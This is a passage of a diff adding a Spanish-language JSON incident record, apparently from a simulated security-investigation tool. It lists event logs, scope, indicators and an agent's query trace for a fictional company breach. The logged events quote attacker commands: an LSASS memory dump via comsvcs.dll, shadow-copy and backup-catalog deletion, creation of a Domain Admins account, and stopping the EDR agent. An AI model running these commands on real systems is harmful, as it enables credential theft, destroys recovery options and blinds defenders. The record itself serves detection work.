+        "timestamp": "2026-10-10T00:22:00.000Z",
+        "event_id": "EDR-0123412",
+        "source": "edr_events",
+        "nivel": "núcleo",
+        "description": "WS-BCN-1770 · process_start · NT AUTHORITY\\SYSTEM · rundll32.exe rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 708 C:\\ProgramData\\l.dmp full {\"target_process\": \"lsass.exe (pid 708)\"}",
+        "mitre": "T1003.001",
+        "senales": [
+          "alerta: citado por ALR-20261010-011795"
+        ],
+        "entidades": [
+          "hash:9dd6d63b39062871d97565ca7a98d52dc8c329cc61ec22c27295aab29d646243",
+          "host:WS-BCN-1770",
+          "user:system"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:28:00.000Z",
+        "event_id": "FW-0025181",
+        "source": "firewall",
+        "nivel": "núcleo",
+        "description": "10.10.3.95 → 10.20.4.77:445 deny (60 B, INTERNAL)",
+        "mitre": "T1046",
+        "senales": [
+          "alerta: citado por ALR-20261010-011796"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:28:01.000Z",
+        "event_id": "FW-0025182",
+        "source": "firewall",
+        "nivel": "núcleo",
+        "description": "10.10.3.95 → 10.20.6.78:22 deny (60 B, INTERNAL)",
+        "mitre": "T1046",
+        "senales": [
+          "alerta: citado por ALR-20261010-011796"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:28:02.000Z",
+        "event_id": "FW-0025183",
+        "source": "firewall",
+        "nivel": "núcleo",
+        "description": "10.10.3.95 → 10.20.5.59:445 deny (60 B, INTERNAL)",
+        "mitre": "T1046",
+        "senales": [
+          "alerta: citado por ALR-20261010-011796"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:28:03.000Z",
+        "event_id": "FW-0025184",
+        "source": "firewall",
+        "nivel": "núcleo",
+        "description": "10.10.3.95 → 10.20.6.25:445 deny (60 B, INTERNAL)",
+        "mitre": "T1046",
+        "senales": [
+          "alerta: citado por ALR-20261010-011796"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:28:04.000Z",
+        "event_id": "FW-0025185",
+        "source": "firewall",
+        "nivel": "núcleo",
+        "description": "10.10.3.95 → 10.20.3.76:1433 deny (60 B, INTERNAL)",
+        "mitre": "T1046",
+        "senales": [
+          "alerta: citado por ALR-20261010-011796"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:28:05.000Z",
+        "event_id": "FW-0025186",
+        "source": "firewall",
+        "nivel": "núcleo",
+        "description": "10.10.3.95 → 10.20.2.47:1433 allow (60 B, INTERNAL)",
+        "mitre": "T1046",
+        "senales": [
+          "alerta: citado por ALR-20261010-011796"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:28:06.000Z",
+        "event_id": "FW-0025187",
+        "source": "firewall",
+        "nivel": "núcleo",
+        "description": "10.10.3.95 → 10.20.4.67:135 deny (60 B, INTERNAL)",
+        "mitre": "T1046",
+        "senales": [
+          "alerta: citado por ALR-20261010-011796"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:28:07.000Z",
+        "event_id": "FW-0025188",
+        "source": "firewall",
+        "nivel": "núcleo",
+        "description": "10.10.3.95 → 10.20.4.53:445 deny (60 B, INTERNAL)",
+        "mitre": "T1046",
+        "senales": [
+          "alerta: citado por ALR-20261010-011796"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:28:08.000Z",
+        "event_id": "FW-0025189",
+        "source": "firewall",
+        "nivel": "núcleo",
+        "description": "10.10.3.95 → 10.20.4.81:445 deny (60 B, INTERNAL)",
+        "mitre": "T1046",
+        "senales": [
+          "alerta: citado por ALR-20261010-011796"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:28:09.000Z",
+        "event_id": "FW-0025190",
+        "source": "firewall",
+        "nivel": "núcleo",
+        "description": "10.10.3.95 → 10.20.1.89:135 deny (60 B, INTERNAL)",
+        "mitre": "T1046",
+        "senales": [
+          "alerta: citado por ALR-20261010-011796"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:28:10.000Z",
+        "event_id": "FW-0025191",
+        "source": "firewall",
+        "nivel": "núcleo",
+        "description": "10.10.3.95 → 10.20.2.34:3389 allow (60 B, INTERNAL)",
+        "mitre": "T1046",
+        "senales": [
+          "alerta: citado por ALR-20261010-011796"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:28:11.000Z",
+        "event_id": "FW-0025192",
+        "source": "firewall",
+        "nivel": "núcleo",
+        "description": "10.10.3.95 → 10.20.6.68:1433 deny (60 B, INTERNAL)",
+        "mitre": "T1046",
+        "senales": [
+          "alerta: citado por ALR-20261010-011796"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:28:12.000Z",
+        "event_id": "FW-0025193",
+        "source": "firewall",
+        "nivel": "núcleo",
+        "description": "10.10.3.95 → 10.20.5.46:135 deny (60 B, INTERNAL)",
+        "mitre": "T1046",
+        "senales": [
+          "alerta: citado por ALR-20261010-011796"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:28:13.000Z",
+        "event_id": "FW-0025194",
+        "source": "firewall",
+        "nivel": "núcleo",
+        "description": "10.10.3.95 → 10.20.4.75:445 deny (60 B, INTERNAL)",
+        "mitre": "T1046",
+        "senales": [
+          "alerta: citado por ALR-20261010-011796"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:28:14.000Z",
+        "event_id": "FW-0025195",
+        "source": "firewall",
+        "nivel": "núcleo",
+        "description": "10.10.3.95 → 10.20.5.11:135 deny (60 B, INTERNAL)",
+        "mitre": "T1046",
+        "senales": [
+          "alerta: citado por ALR-20261010-011796"
+        ],
+        "entidades": [
+          "host:WS-BCN-1770"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:40:00.000Z",
+        "event_id": "FW-0025321",
+        "source": "firewall",
+        "nivel": "núcleo",
+        "description": "10.10.3.95 → 10.20.2.20:445 allow (380000 B, INTERNAL)",
+        "mitre": "T1021.002",
+        "senales": [
+          "alerta: citado por ALR-20261010-011797"
+        ],
+        "entidades": [
+          "host:FS01",
+          "host:WS-BCN-1770"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:40:04.000Z",
+        "event_id": "EDR-0123413",
+        "source": "edr_events",
+        "nivel": "núcleo",
+        "description": "FS01 · service_install · TARVIA\\adm.aortega · services.exe {\"service_name\": \"PSEXESVC\", \"image\": \"C:\\\\Windows\\\\PSEXESVC.exe\", \"remote_host\": \"WS-BCN-1770\"}",
+        "mitre": "T1021.002",
+        "senales": [
+          "alerta: citado por ALR-20261010-011797",
+          "operacion: edr_events/service_install (9 en 4 semanas)"
+        ],
+        "entidades": [
+          "host:FS01",
+          "host:WS-BCN-1770",
+          "user:adm.aortega"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:40:09.000Z",
+        "event_id": "EDR-0123414",
+        "source": "edr_events",
+        "nivel": "núcleo",
+        "description": "FS01 · process_start · TARVIA\\adm.aortega · svchelper.exe C:\\ProgramData\\svchelper.exe",
+        "mitre": "T1021.002",
+        "senales": [
+          "alerta: citado por ALR-20261010-011797",
+          "ioc: indicador del ataque: 70aa203e2e17260ab3f760a84404b9c9ace4397d7d0b8e4713534f40b1353c44"
+        ],
+        "entidades": [
+          "hash:70aa203e2e17260ab3f760a84404b9c9ace4397d7d0b8e4713534f40b1353c44",
+          "host:FS01",
+          "user:adm.aortega"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:51:06.000Z",
+        "event_id": "EDR-0123435",
+        "source": "edr_events",
+        "nivel": "núcleo",
+        "description": "PRINT01 · process_start · TARVIA\\adm.aortega · spoolhlp.exe C:\\Windows\\Temp\\spoolhlp.exe {\"note\": \"mismo hash que svchelper.exe de FS01\"}",
+        "mitre": "",
+        "senales": [
+          "ioc: indicador del ataque: 70aa203e2e17260ab3f760a84404b9c9ace4397d7d0b8e4713534f40b1353c44"
+        ],
+        "entidades": [
+          "hash:70aa203e2e17260ab3f760a84404b9c9ace4397d7d0b8e4713534f40b1353c44",
+          "host:PRINT01",
+          "user:adm.aortega"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T00:56:00.000Z",
+        "event_id": "FW-0026543",
+        "source": "firewall",
+        "nivel": "núcleo",
+        "description": "10.20.6.63 → 107.174.115.43:443 allow (8806 B, OUTBOUND-SERVERS-WEB)  (×49 hasta 2026-10-17T23:46)",
+        "mitre": "T1071",
+        "senales": [
+          "ioc: indicador del ataque: 107.174.115.43"
+        ],
+        "entidades": [
+          "host:PRINT01",
+          "ip:107.174.115.43"
+        ],
+        "repeticiones": 49,
+        "hasta": "2026-10-17T23:46:00.000Z",
+        "event_ids": [
+          "FW-0026543",
+          "FW-0026544",
+          "FW-0026545",
+          "FW-0026546",
+          "FW-0026547"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T01:05:00.000Z",
+        "event_id": "EDR-0123415",
+        "source": "edr_events",
+        "nivel": "núcleo",
+        "description": "FS01 · process_start · TARVIA\\adm.aortega · vssadmin.exe vssadmin.exe delete shadows /all /quiet",
+        "mitre": "T1490",
+        "senales": [
+          "alerta: citado por ALR-20261010-011798",
+          "raro: poco común en la empresa: 0abd51be4e6e6b6f40c60280815ccd51207c4d40318354dcd9fd25372f47763c"
+        ],
+        "entidades": [
+          "hash:0abd51be4e6e6b6f40c60280815ccd51207c4d40318354dcd9fd25372f47763c",
+          "host:FS01",
+          "user:adm.aortega"
+        ]
+      },
+      {
+        "timestamp": "2026-10-10T01:05:05.000Z",
+        "event_id": "EDR-0123416",
+        "source": "edr_events",
+        "nivel": "núcleo",
+        "description": "FS01 · process_start · TARVIA\\adm.aortega · wbadmin.exe wbadmin delete catalog -quiet",
+        "mitre": "T1490",
+        "senales": [
+          "alerta: citado por ALR-20261010-011798",
+          "raro: poco común en la empresa: f1932fbb0101bdb901fee55aa4525c72be3e9e3d2e834947adf0f6b0e5cff1c9"
+        ],
+        "entidades": [
+          "hash:f1932fbb0101bdb901fee55aa4525c72be3e9e3d2e834947adf0f6b0e5cff1c9",
+          "host:FS01",
+          "user:adm.aortega"
+        ]
+      },
+      {
+        "timestamp": "2026-10-13T08:30:00.000Z",
+        "event_id": "EDR-0123429",
+        "source": "edr_events",
+        "nivel": "pivote",
+        "description": "ERP-APP01 · service_install · TARVIA\\adm.dnavarro · services.exe {\"service_name\": \"PSEXESVC\", \"image\": \"C:\\\\Windows\\\\PSEXESVC.exe\", \"remote_host\": \"JUMP01\", \"payload\": \"Instalación agen",
+        "mitre": "T1021.002",
+        "senales": [
+          "alerta: citado por ALR-20261013-011869 (alerta de fuera del incidente)",
+          "operacion: edr_events/service_install (9 en 4 semanas)"
+        ],
+        "entidades": [
+          "host:ERP-APP01",
+          "host:JUMP01",
+          "user:adm.dnavarro"
+        ]
+      },
+      {
+        "timestamp": "2026-10-13T08:36:00.000Z",
+        "event_id": "EDR-0123430",
+        "source": "edr_events",
+        "nivel": "pivote",
+        "description": "HR-APP01 · service_install · TARVIA\\adm.dnavarro · services.exe {\"service_name\": \"PSEXESVC\", \"image\": \"C:\\\\Windows\\\\PSEXESVC.exe\", \"remote_host\": \"JUMP01\", \"payload\": \"Instalación agen",
+        "mitre": "T1021.002",
+        "senales": [
+          "alerta: citado por ALR-20261013-011870 (alerta de fuera del incidente)",
+          "operacion: edr_events/service_install (9 en 4 semanas)"
+        ],
+        "entidades": [
+          "host:HR-APP01",
+          "host:JUMP01",
+          "user:adm.dnavarro"
+        ]
+      },
+      {
+        "timestamp": "2026-10-13T08:42:00.000Z",
+        "event_id": "EDR-0123431",
+        "source": "edr_events",
+        "nivel": "pivote",
+        "description": "PRINT01 · service_install · TARVIA\\adm.dnavarro · services.exe {\"service_name\": \"PSEXESVC\", \"image\": \"C:\\\\Windows\\\\PSEXESVC.exe\", \"remote_host\": \"JUMP01\", \"payload\": \"Instalación agen",
+        "mitre": "T1021.002",
+        "senales": [
+          "alerta: citado por ALR-20261013-011871 (alerta de fuera del incidente)",
+          "operacion: edr_events/service_install (9 en 4 semanas)"
+        ],
+        "entidades": [
+          "host:JUMP01",
+          "host:PRINT01",
+          "user:adm.dnavarro"
+        ]
+      },
+      {
+        "timestamp": "2026-10-13T08:48:00.000Z",
+        "event_id": "EDR-0123432",
+        "source": "edr_events",
+        "nivel": "pivote",
+        "description": "CRM-APP01 · service_install · TARVIA\\adm.dnavarro · services.exe {\"service_name\": \"PSEXESVC\", \"image\": \"C:\\\\Windows\\\\PSEXESVC.exe\", \"remote_host\": \"JUMP01\", \"payload\": \"Instalación agen",
+        "mitre": "T1021.002",
+        "senales": [
+          "alerta: citado por ALR-20261013-011872 (alerta de fuera del incidente)",
+          "operacion: edr_events/service_install (9 en 4 semanas)"
+        ],
+        "entidades": [
+          "host:CRM-APP01",
+          "host:JUMP01",
+          "user:adm.dnavarro"
+        ]
+      },
+      {
+        "timestamp": "2026-10-18T01:12:00.000Z",
+        "event_id": "ADE-0000570",
+        "source": "ad_events",
+        "nivel": "núcleo",
+        "description": "Se creó una cuenta de usuario (4720): adm.aortega → svc_print_upd en PRINT01 {\"description\": \"\", \"password_never_expires\": true}",
+        "mitre": "T1098",
+        "senales": [
+          "alerta: citado por ALR-20261018-011895",
+          "operacion: ad_events/4720 (1 en 4 semanas)"
+        ],
+        "entidades": [
+          "host:PRINT01",
+          "user:adm.aortega",
+          "user:svc_print_upd"
+        ]
+      },
+      {
+        "timestamp": "2026-10-18T01:13:00.000Z",
+        "event_id": "ADE-0000571",
+        "source": "ad_events",
+        "nivel": "núcleo",
+        "description": "Se agregó un miembro a un grupo global con seguridad habilitada (4728): adm.aortega → svc_print_upd en PRINT01 {\"group\": \"Domain Admins\"}",
+        "mitre": "T1098",
+        "senales": [
+          "alerta: citado por ALR-20261018-011895",
+          "operacion: ad_events/4728 (2 en 4 semanas)"
+        ],
+        "entidades": [
+          "host:PRINT01",
+          "user:adm.aortega",
+          "user:svc_print_upd"
+        ]
+      },
+      {
+        "timestamp": "2026-10-18T01:18:00.000Z",
+        "event_id": "EDR-0123436",
+        "source": "edr_events",
+        "nivel": "núcleo",
+        "description": "PRINT01 · process_start · NT AUTHORITY\\SYSTEM · sc.exe sc.exe stop EDRAgentSvc",
+        "mitre": "T1562.001",
+        "senales": [
+          "alerta: citado por ALR-20261018-011896",
+          "raro: poco común en la empresa: cc4f10c3842eb781de989fad673a9b7b2945c5972d215085f1ededd94559c288"
+        ],
+        "entidades": [
+          "hash:cc4f10c3842eb781de989fad673a9b7b2945c5972d215085f1ededd94559c288",
+          "host:PRINT01",
+          "user:system"
+        ]
+      },
+      {
+        "timestamp": "2026-10-18T01:18:20.000Z",
+        "event_id": "EDR-0123437",
+        "source": "edr_events",
+        "nivel": "núcleo",
+        "description": "PRINT01 · agent_status ·  · EDRAgentSvc {\"status\": \"stopped\", \"last_heartbeat\": \"ver evento\"}",
+        "mitre": "T1562.001",
+        "senales": [
+          "alerta: citado por ALR-20261018-011896",
+          "operacion: edr_events/agent_status (7 en 4 semanas)"
+        ],
+        "entidades": [
+          "host:PRINT01"
+        ]
+      }
+    ],
+    "eventos_notables": 1390,
+    "contexto_descartado": {
+      "eventos": 2,
+      "tipos": [
+        [
+          "edr_events/detection",
+          1
+        ],
+        [
+          "idp_signins/success/not_applicable",
+          1
+        ]
+      ]
+    },
+    "acceso_inicial_candidatos": [
+      {
+        "event_id": "EML-0062206",
+        "timestamp": "2026-10-09T09:04:00.000Z",
+        "description": "Correo de pedidos@pedidos-hilaturas-alcoi.example a marta.puig@tarvia.example: «RE: Pedido Q4 2026 - confirmación de cantidades» [Pedido_Q4_2026.zip]",
+        "nivel": "núcleo"
+      }
+    ],
+    "paciente_cero_candidato": [
+      "marta.puig"
+    ],
+    "alcance": {
+      "hosts": [
+        "WS-BCN-1770",
+        "PRINT01",
+        "FS01",
+        "JUMP01",
+        "ERP-APP01",
+        "HR-APP01",
+        "CRM-APP01"
+      ],
+      "users": [
+        "marta.puig",
+        "adm.aortega",
+        "adm.dnavarro",
+        "system",
+        "svc_print_upd"
+      ],
+      "servicios": [
+        "CRM y datos de clientes (1,3 M registros, RGPD)",
+        "ERP: finanzas, compras, stock",
+        "Nóminas y portal del empleado",
+        "Puesto de trabajo"
+      ],
+      "bytes_salida_eventos_notables": 274219,
+      "filas_sql": 0,
+      "objetos_cloud_leidos": {},
+      "criticidad": {
+        "WS-BCN-1770": "Media",
+        "FS01": "Alta",
+        "PRINT01": "Baja",
+        "JUMP01": "Alta",
+        "ERP-APP01": "Alta",
+        "HR-APP01": "Alta",
+        "CRM-APP01": "Alta"
+      }
+    },
+    "relacionados": [
+      {
+        "incidente": "ALR-20261013-011869",
+        "alertas": [
+          "ALR-20261013-011869",
+          "ALR-20261013-011870",
+          "ALR-20261013-011871",
+          "ALR-20261013-011872"
+        ],
+        "eventos": [
+          "EDR-0123429",
+          "EDR-0123430",
+          "EDR-0123431",
+          "EDR-0123432"
+        ]
+      }
+    ],
+    "huecos": [
+      {
+        "fuente": "dns",
+        "tipo": "?",
+        "total": 53,
+        "eventos": [
+          "DNS-0191506",
+          "DNS-0191507",
+          "DNS-0191508",
+          "DNS-0191509",
+          "DNS-0191510"
+        ],
+        "ejemplo": "indicador del ataque: 203.0.113.88, aplihartom.com"
+      },
+      {
+        "fuente": "firewall",
+        "tipo": "?",
+        "total": 49,
+        "eventos": [
+          "FW-0026543",
+          "FW-0026544",
+          "FW-0026545",
+          "FW-0026546",
+          "FW-0026547"
+        ],
+        "ejemplo": "indicador del ataque: 107.174.115.43"
+      },
+      {
+        "fuente": "edr_events",
+        "tipo": "process_start",
+        "total": 1,
+        "eventos": [
+          "EDR-0123435"
+        ],
+        "ejemplo": "indicador del ataque: 70aa203e2e17260ab3f760a84404b9c9ace4397d7d0b8e4713534f40b1353c44"
+      }
+    ],
+    "estadisticas": {
+      "segundos": 5.0,
+      "consultas_indice": 35,
+      "entidades": 19,
+      "eventos_notables": 1390
+    }
+  },
+  "traza": [
+    {
+      "tool": "cambios",
+      "args": {
+        "ruta": "/changes"
+      },
+      "origen": "agente",
+      "ms": 2,
+      "chars": 3442,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.12.9"
+      },
+      "origen": "incidentes",
+      "ms": 2,
+      "chars": 252,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.12.13"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.11.130"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.11.200"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.11.61"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/wetransfer.com"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 352,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/carmen.sala@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 2,
+      "chars": 441,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/judith.lozano@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 440,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/mireia.costa@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 444,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/marina.castro@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 447,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/olga.vila@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 424,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/neus.parra@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 438,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/sara.ferrer@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 430,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/adria.aguilar@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 436,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/laura.ferrer2@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 435,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/marc.reyes@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 434,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/carmen.serra@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 440,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/pablo.soler@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 434,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/jordi.serra2@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 639,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/miguel.bosch@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 444,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/guillem.llorens@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 446,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/sergio.puig@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 404,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/patricia.medina@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 453,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/marta.puig@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 433,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/ricard.nunez@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 438,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:vpn",
+      "args": {
+        "q": "ext.logisoft",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "incidentes",
+      "ms": 33,
+      "chars": 30,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.99.60.77",
+        "desde": "2026-10-09T16:06:00Z",
+        "hasta": "2026-10-09T20:06:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 4,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/ext.logisoft@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 574,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:idp_signins",
+      "args": {
+        "q": "adm.aortega",
+        "desde": "2026-10-09T00:23:30Z",
+        "hasta": "2026-10-11T00:23:30Z"
+      },
+      "origen": "incidentes",
+      "ms": 33,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:ad_events",
+      "args": {
+        "q": "adm.aortega",
+        "desde": "2026-10-09T00:23:30Z",
+        "hasta": "2026-10-11T00:23:30Z"
+      },
+      "origen": "incidentes",
+      "ms": 2,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:edr_events",
+      "args": {
+        "q": "adm.aortega",
+        "desde": "2026-10-09T00:23:30Z",
+        "hasta": "2026-10-11T00:23:30Z"
+      },
+      "origen": "incidentes",
+      "ms": 43,
+      "chars": 5,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/FS01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 611,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-10T00:30:04Z",
+        "hasta": "2026-10-10T00:50:04Z"
+      },
+      "origen": "incidentes",
+      "ms": 4,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/FS01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 611,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-10T00:30:09Z",
+        "hasta": "2026-10-10T00:50:09Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/PRINT01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 544,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-10T00:41:06Z",
+        "hasta": "2026-10-10T01:01:06Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/FS01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 611,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-10T00:55:00Z",
+        "hasta": "2026-10-10T01:15:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/FS01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 611,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-10T00:55:05Z",
+        "hasta": "2026-10-10T01:15:05Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:idp_signins",
+      "args": {
+        "q": "adm.aortega",
+        "desde": "2026-10-09T00:42:37Z",
+        "hasta": "2026-10-11T00:42:37Z"
+      },
+      "origen": "incidentes",
+      "ms": 33,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:ad_events",
+      "args": {
+        "q": "adm.aortega",
+        "desde": "2026-10-09T00:42:37Z",
+        "hasta": "2026-10-11T00:42:37Z"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:edr_events",
+      "args": {
+        "q": "adm.aortega",
+        "desde": "2026-10-09T00:42:37Z",
+        "hasta": "2026-10-11T00:42:37Z"
+      },
+      "origen": "incidentes",
+      "ms": 43,
+      "chars": 5,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/FS01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 611,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-10T00:30:04Z",
+        "hasta": "2026-10-10T00:50:04Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/FS01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 611,
+      "error": null,
+      "preview": ""
